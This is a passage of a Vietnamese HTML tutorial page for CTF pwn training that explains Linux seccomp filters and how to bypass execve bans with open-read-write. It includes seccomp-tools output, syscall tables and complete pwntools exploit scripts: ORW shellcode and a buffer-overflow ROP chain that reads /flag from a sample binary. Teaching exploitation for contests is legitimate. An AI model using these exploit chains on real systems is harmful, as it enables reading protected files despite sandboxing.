@@ -1,0 +1,489 @@
+<title>Seccomp & ORW</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,46px);line-height:1.03;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+.scbox{background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin:12px 0;font-family:var(--font-mono);font-size:12.5px}
+.scbox input{font-family:var(--font-mono);font-size:14px;padding:6px 9px;border:1px solid var(--line);border-radius:6px;background:var(--surface);color:var(--fg);width:70px}
+.scbox .verdict{margin-top:10px;padding:8px 12px;border-radius:8px;font-weight:700}
+.scbox .allow{background:var(--ok-soft);color:var(--ok)}
+.scbox .kill{background:var(--danger-soft);color:var(--danger)}
+.scbox .row{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:4px 0}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 5 · Sandbox</div>
+    <h1>Seccomp &amp; ORW</h1>
+    <p class="sub">Đề cấm <code>execve</code>/<code>execveat</code> bằng <strong>seccomp</strong> (bộ lọc syscall trong kernel). Không mở được shell → phải <strong>đọc flag trực tiếp</strong> bằng chuỗi <mark>open → read → write</mark> (ORW). Bài này: đọc filter bằng <code>seccomp-tools</code>, dựng ORW shellcode/ROP số thật đọc <code>/flag</code>.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Trung–Cao (Phase 5)</span>
+      <span class="chip"><b>Binary mẫu:</b> x86-64, seccomp strict</span>
+      <span class="chip"><b>Cần trước:</b> <a href="rop_basics.html" style="color:inherit">ROP</a> · <a href="ret2shellcode.html" style="color:inherit">shellcode</a></span>
+      <span class="chip"><b>Thời lượng:</b> ~60 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Đọc filter</a><a href="#s4">04 ORW là gì</a><a href="#s5">05 Mô phỏng</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Seccomp:</strong> kernel lọc syscall theo một chương trình BPF. Đề thường cấm <code>execve</code>(59)/<code>execveat</code>(322) → <code>system("/bin/sh")</code> bị giết (SIGSYS).</p>
+    <p><strong>ORW:</strong> thay vì shell, dùng 3 syscall được phép: <code>open("/flag",0)</code> → <code>read(fd,buf,0x40)</code> → <code>write(1,buf,0x40)</code>. Flag in ra màn hình.</p>
+    <p><strong>Cách làm:</strong> đọc filter bằng <code>seccomp-tools dump</code>, xác nhận open/read/write cho phép, rồi dựng ORW bằng shellcode (nếu RWX) hoặc ROP/syscall (nếu NX).</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>Cấm execve? Đừng mở shell — open+read+write để tự đọc /flag.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🔎 Đọc filter</span>
+<pre><code>seccomp-tools dump ./chall
+# xem dòng execve/execveat → KILL ? → phải ORW
+# open/openat, read, write → ALLOW ? → ORW được</code></pre></div>
+      <div class="combat-row"><span class="lab">📋 Số syscall x86-64</span>
+<pre><code>read=0  write=1  open=2  openat=257
+close=3  execve=59  mprotect=10  exit=60</code></pre></div>
+      <div class="combat-row"><span class="lab">🐚 ORW shellcode (có RWX)</span>
+<pre><code>sc = shellcraft.open('/flag') + \
+     shellcraft.read('rax','rsp',0x40) + \
+     shellcraft.write(1,'rsp',0x40)
+# hoặc shellcraft.cat('/flag')  (tự open+read+write)</code></pre></div>
+      <div class="combat-row"><span class="lab">⛓️ ORW ROP (NX)</span>
+        <p>Ghi "/flag\0" vào bss, rồi ROP: open(bss,0) → read(rax,bss2,0x40) → write(1,bss2,0x40). Dùng pop rdi/rsi/rdx/rax + syscall.</p></div>
+      <div class="combat-row"><span class="lab">⚠️ Nhớ</span>
+        <p>openat(257) nếu open bị cấm. flag có thể "flag"/"/flag"/"flag.txt" — thử vài tên. fd open trả về → dùng cho read (thường = 3). Kiến trúc: x86 syscall number KHÁC.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Seccomp = bộ lọc syscall</h2>
+  <p><span class="mem-term">seccomp</span> (secure computing) là cơ chế kernel Linux cho phép một process tự khai báo: "từ giờ chỉ cho tôi gọi các syscall này". Chế độ mạnh là <strong>seccomp-BPF</strong>: nạp một chương trình <span class="mem-term">BPF</span> (Berkeley Packet Filter) chạy trên mỗi lần syscall, kiểm <code>nr</code> (số syscall) + arch rồi trả <code>ALLOW</code> / <code>KILL</code> (giết tiến trình bằng SIGSYS) / <code>ERRNO</code> / <code>TRACE</code>. Đề CTF dùng nó để <strong>cấm execve</strong>, buộc bạn không mở shell.</p>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">seccomp</div><p>Kernel lọc syscall của process.</p></div>
+    <div class="card"><div class="term">BPF filter</div><p>Chương trình quyết ALLOW/KILL mỗi syscall.</p></div>
+    <div class="card"><div class="term">SIGSYS</div><p>Tín hiệu giết khi gọi syscall cấm.</p></div>
+    <div class="card"><div class="term">ORW</div><p>open+read+write — đọc file thủ công.</p></div>
+    <div class="card"><div class="term">syscall nr</div><p>Số hiệu syscall (read=0...).</p></div>
+    <div class="card"><div class="term">fd</div><p>File descriptor open trả về (≥3).</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Shell bị cấm → đọc flag tay</h2>
+  <p>Payload pwn "chuẩn" kết thúc bằng <code>execve("/bin/sh")</code> → shell → <code>cat flag</code>. Seccomp chặn đúng cái đó: dù bạn đã chiếm RIP hoàn toàn, gọi execve → <strong>SIGSYS, chết ngay</strong>. Nhưng flag chỉ là một file. Nếu <code>open</code>/<code>read</code>/<code>write</code> vẫn được phép (đề hiếm khi cấm hết — process còn phải chạy), bạn <em>tự đọc file</em>: mở <code>/flag</code>, đọc vào buffer, in ra stdout. Đó là ORW. Đây là kỹ năng <strong>bắt buộc</strong> ở Phase 5 vì gần như mọi đề pwn khó đều bật seccomp.</p>
+ </div>
+</section>
+
+<!-- 03 Đọc filter -->
+<section class="block" id="s3">
+ <div class="wrap wide">
+  <div class="secnum">03 / ĐỌC FILTER · MỤC LÕI</div>
+  <h2><code>seccomp-tools dump</code> (output thật)</h2>
+  <pre><code><span class="p">$</span> seccomp-tools dump ./chall
+ line  CODE  JT   JF      K
+=================================
+ <span class="d">0000</span>: 0x20 0x00 0x00 0x00000004  A = arch
+ <span class="d">0001</span>: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009  <span class="c"># chặn x32</span>
+ <span class="d">0002</span>: 0x20 0x00 0x00 0x00000000  A = sys_number
+ <span class="d">0003</span>: 0x15 0x05 0x00 0x0000003b  if (A == <span class="d">execve</span>)  goto 0009  <span class="c"># 0x3b=59 → KILL</span>
+ <span class="d">0004</span>: 0x15 0x04 0x00 0x00000142  if (A == <span class="d">execveat</span>) goto 0009 <span class="c"># 0x142=322 → KILL</span>
+ <span class="d">0005</span>: 0x15 0x03 0x00 0x00000039  if (A == fork)   goto 0009
+ <span class="d">0006</span>: 0x15 0x00 0x01 0x00000002  if (A != open)   goto 0008
+ <span class="d">0007</span>: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ <span class="d">0008</span>: 0x06 0x00 0x00 0x7fff0000  return ALLOW   <span class="c"># mặc định ALLOW phần còn lại</span>
+ <span class="d">0009</span>: 0x06 0x00 0x00 0x00000000  return KILL</code></pre>
+  <div class="note"><span class="tag">Đọc nhanh</span>Dòng <code>if (A == execve) goto 0009</code> và 0009 là <code>return KILL</code> → <strong>execve bị giết</strong>. <code>return ALLOW</code> ở default (0008) → open/read/write <strong>được phép</strong> → ORW chạy tốt. Luôn dump trước để biết syscall nào còn sống.</div>
+  <h4>Hai kiểu filter thường gặp</h4>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Kiểu</th><th>Logic</th><th>Hệ quả</th></tr></thead>
+    <tbody>
+      <tr><td><b>Blacklist</b></td><td>default ALLOW, KILL vài syscall (execve...)</td><td>Dễ: ORW luôn được</td></tr>
+      <tr><td><b>Whitelist</b></td><td>default KILL, ALLOW đúng open/read/write/exit</td><td>Phải ORW đúng các syscall whitelist</td></tr>
+      <tr><td><b>Chặn open</b></td><td>cấm cả open(2)</td><td>Dùng <code>openat(257)</code> thay</td></tr>
+    </tbody>
+  </table></div>
+ </div>
+</section>
+
+<!-- 04 ORW là gì -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / ORW LÀ GÌ</div>
+  <h2>3 syscall đọc file (số thật)</h2>
+  <figure class="dg">
+  <svg viewBox="0 0 580 110" role="img" aria-label="open trả fd 3; read fd vào buffer; write buffer ra stdout fd 1" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <g font-family="monospace" font-size="10.5">
+    <rect x="18" y="40" width="150" height="40" rx="7" stroke-width="1.6" stroke="#e8663e"/><text x="93" y="56" text-anchor="middle" fill="#e8663e" stroke="none">open("/flag",0)</text><text x="93" y="70" text-anchor="middle" fill="#e8663e" stroke="none">rax=2 → fd=3</text>
+    <rect x="215" y="40" width="150" height="40" rx="7" stroke-width="1.6" stroke="var(--mem)"/><text x="290" y="56" text-anchor="middle" fill="var(--mem)" stroke="none">read(3,buf,0x40)</text><text x="290" y="70" text-anchor="middle" fill="var(--mem)" stroke="none">rax=0</text>
+    <rect x="412" y="40" width="150" height="40" rx="7" stroke-width="1.6" stroke="#2f7d4f"/><text x="487" y="56" text-anchor="middle" fill="#2f7d4f" stroke="none">write(1,buf,0x40)</text><text x="487" y="70" text-anchor="middle" fill="#2f7d4f" stroke="none">rax=1 → flag in</text>
+    <line x1="168" y1="60" x2="213" y2="60" stroke-width="1.5" marker-end="url(#ao)"/>
+    <line x1="365" y1="60" x2="410" y2="60" stroke-width="1.5" marker-end="url(#ao)"/>
+    </g>
+    <defs><marker id="ao" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="currentColor" stroke="none"/></marker></defs>
+    <text x="290" y="100" font-size="11" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.72">open→fd 3 · read fd 3 vào buf · write buf ra fd 1 (stdout).</text>
+  </svg>
+  <figcaption>ORW: mở flag (fd 3), đọc vào buffer, in ra stdout.</figcaption>
+  </figure>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Syscall</th><th>nr (rax)</th><th>rdi</th><th>rsi</th><th>rdx</th><th>trả về</th></tr></thead>
+    <tbody>
+      <tr><td>open</td><td><code>2</code></td><td>ptr "/flag"</td><td>0 (O_RDONLY)</td><td>0</td><td>fd (=3)</td></tr>
+      <tr><td>read</td><td><code>0</code></td><td>fd (3)</td><td>buf</td><td>0x40 (len)</td><td>số byte</td></tr>
+      <tr><td>write</td><td><code>1</code></td><td>1 (stdout)</td><td>buf</td><td>0x40</td><td>số byte</td></tr>
+      <tr><td>openat</td><td><code>257</code></td><td>AT_FDCWD<br>=-100</td><td>ptr path</td><td>0</td><td>fd</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note tip"><span class="tag">fd = 3</span>stdin=0, stdout=1, stderr=2 đã mở sẵn → file đầu tiên bạn open trả <code>fd=3</code>. Nếu open 2 file, file sau = 4. Dùng đúng fd cho read.</div>
+ </div>
+</section>
+
+<!-- 05 Mô phỏng -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Filter checker: syscall này sống không?</h2>
+  <p>Nhập số syscall (rax) → công cụ mô phỏng filter mẫu ở mục 03 (cấm execve 59, execveat 322, fork 57; còn lại ALLOW) → báo tiến trình sống hay bị SIGSYS.</p>
+  <div class="lab">
+    <div class="scbox" id="sc">
+      <div class="row">
+        <span>syscall nr (rax):</span>
+        <input id="nrIn" value="59">
+        <button id="chkBtn" style="font-family:var(--font-mono);font-size:12px;padding:6px 12px;border:1px solid var(--line);border-radius:7px;background:var(--surface);color:var(--fg);cursor:pointer">kiểm</button>
+      </div>
+      <div class="row" style="opacity:.75">gợi ý: 0=read 1=write 2=open 59=execve 257=openat 10=mprotect 60=exit</div>
+      <div class="verdict" id="scVerdict"></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Filter, tên flag, cơ chế ghi payload</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Dump filter</h4>
+    <pre><code><span class="p">$</span> seccomp-tools dump ./chall   <span class="c"># syscall nào ALLOW/KILL</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Tên &amp; đường dẫn flag</h4>
+    <pre><code><span class="c"># thử "/flag", "flag", "flag.txt", "/home/ctf/flag"</span>
+<span class="c"># xem strings binary / đề bài thường ghi</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>RWX hay NX?</h4>
+    <pre><code><span class="p">$</span> checksec ./chall    <span class="c"># NX enabled → ROP; RWX/shellcode input → shellcode ORW</span></code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>ORW shellcode + ORW ROP (số thật)</h2>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · ORW shellcode</button>
+    <button class="tab" data-t="b">B · ORW ROP (NX)</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — có vùng RWX / nhập shellcode chạy được. Seccomp cấm execve,</span>
+<span class="c"># nên shellcode làm ORW. Dùng shellcraft (pwntools tự ráp byte đúng).</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.arch = <span class="s">"amd64"</span>
+exe = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>); p = process(exe.path)
+
+<span class="c"># cách 1: ghép tay open/read/write — rõ ràng</span>
+sc  = shellcraft.open(<span class="s">"/flag"</span>, <span class="d">0</span>)          <span class="c"># rax=2, mở → fd ở rax</span>
+sc += shellcraft.read(<span class="s">"rax"</span>, <span class="s">"rsp"</span>, <span class="d">0x40</span>)   <span class="c"># đọc fd (rax) vào [rsp]</span>
+sc += shellcraft.write(<span class="d">1</span>, <span class="s">"rsp"</span>, <span class="d">0x40</span>)      <span class="c"># in [rsp] ra stdout</span>
+<span class="c"># cách 2 gọn: sc = shellcraft.cat("/flag")  # tự open+sendfile/read+write</span>
+
+payload = asm(sc)                            <span class="c"># dịch ra opcode thật</span>
+p.sendafter(b<span class="s">"input:"</span>, payload)            <span class="c"># chèn vào vùng RWX đã nhảy tới</span>
+print(p.recvall(timeout=<span class="d">2</span>))                 <span class="c"># flag in ra</span></code></pre>
+<div class="note warn"><span class="tag">Thành thật</span><code>shellcraft.open/read/write</code> sinh opcode đúng x86-64 (vd open = <code>48b82f666c6167...50 ... b802 0f05</code> push "/flag", rax=2, syscall). Tên <code>/flag</code> và vùng RWX là của đề mẫu; đổi path theo đề. <code>shellcraft.cat("/flag")</code> gọn nhất.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b">
+<pre><code><span class="c"># BẢN B — NX bật, không chạy shellcode → ORW bằng ROP + syscall.</span>
+<span class="c"># Gadget số thật (binary mẫu, no-PIE):</span>
+<span class="c">#   pop rdi;ret = 0x401263 · pop rsi;ret = 0x40955e · pop rdx;ret = 0x4017cf</span>
+<span class="c">#   pop rax;ret = 0x44db34 · syscall    = 0x40137c</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>); p = process(exe.path)
+rdi=<span class="d">0x401263</span>; rsi=<span class="d">0x40955e</span>; rdx=<span class="d">0x4017cf</span>; rax=<span class="d">0x44db34</span>; sysc=<span class="d">0x40137c</span>
+BSS = <span class="d">0x404500</span>                                  <span class="c"># vùng bss ghi được, trống</span>
+OFF = <span class="d">72</span>
+
+<span class="c"># 1) ghi "/flag\0" vào BSS bằng read(0, BSS, 8)</span>
+rop  = flat(rax,<span class="d">0</span>, rdi,<span class="d">0</span>, rsi,BSS, rdx,<span class="d">8</span>, sysc)   <span class="c"># read(0,BSS,8)</span>
+<span class="c"># 2) open(BSS, 0) → fd (giả sử 3)</span>
+rop += flat(rax,<span class="d">2</span>, rdi,BSS, rsi,<span class="d">0</span>, rdx,<span class="d">0</span>, sysc)
+<span class="c"># 3) read(3, BSS+0x100, 0x40)</span>
+rop += flat(rax,<span class="d">0</span>, rdi,<span class="d">3</span>, rsi,BSS+<span class="d">0x100</span>, rdx,<span class="d">0x40</span>, sysc)
+<span class="c"># 4) write(1, BSS+0x100, 0x40)</span>
+rop += flat(rax,<span class="d">1</span>, rdi,<span class="d">1</span>, rsi,BSS+<span class="d">0x100</span>, rdx,<span class="d">0x40</span>, sysc)
+
+p.sendlineafter(b<span class="s">"&gt;"</span>, b<span class="s">"A"</span>*OFF + rop)
+p.send(b<span class="s">"/flag\x00\x00\x00"</span>)                      <span class="c"># cấp cho read bước 1</span>
+print(p.recvall(timeout=<span class="d">2</span>))</code></pre>
+<div class="note tip"><span class="tag">Dùng ROP class</span>Thay vì flat tay: <code>rop=ROP(exe); rop.read(0,BSS,8); rop.open(BSS,0); rop.read(3,BSS+0x100,0x40); rop.write(1,BSS+0x100,0x40)</code> rồi <code>rop.chain()</code> — pwntools tự gom gadget. Nếu không có pop rdx, dùng <a href="ret2csu.html">ret2csu</a> set rdx.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+context.arch=<span class="s">"amd64"</span>; exe=ELF(<span class="s">"./chall"</span>,checksec=<span class="k">False</span>); p=start()
+sc = shellcraft.cat(<span class="s">"/flag"</span>)          <span class="c"># open+read+write gọn</span>
+sa(b<span class="s">"input:"</span>, asm(sc)); print(p.recvall(timeout=<span class="d">2</span>))
+<span class="c"># bản ROP: orw_chain(exe, path="/flag", bss=0x404500)  # helper dựng 4 syscall</span></code></pre>
+<div class="note"><span class="tag">pwnld</span><code>orw_chain</code> dựng sẵn chuỗi open/read/write. Vẫn phải dump filter để chắc open/read/write sống.</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>execve chạy → SIGSYS</h4><p>Quên seccomp. Dump filter, chuyển ORW.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>open bị cấm</h4><p>Dùng openat(257), rdi=AT_FDCWD(-100), rsi=path.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Không có flag in ra</h4><p>Sai tên file / fd sai / rdx=0. Kiểm từng syscall trả về (strace/gdb).</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">seccomp-tools</div><h4>dump filter</h4><p>Xem ALLOW/KILL mỗi syscall.</p></div>
+    <div class="card"><div class="term">shellcraft</div><h4>ORW shellcode</h4><p>open/read/write/cat ráp sẵn.</p></div>
+    <div class="card"><div class="term">ROP(exe)</div><h4>ORW chain</h4><p>rop.open/read/write tự gom.</p></div>
+    <div class="card"><div class="term">strace</div><h4>Xem syscall</h4><p>Syscall nào bị chặn, trả gì.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi flag không ra</h2>
+  <div class="grid">
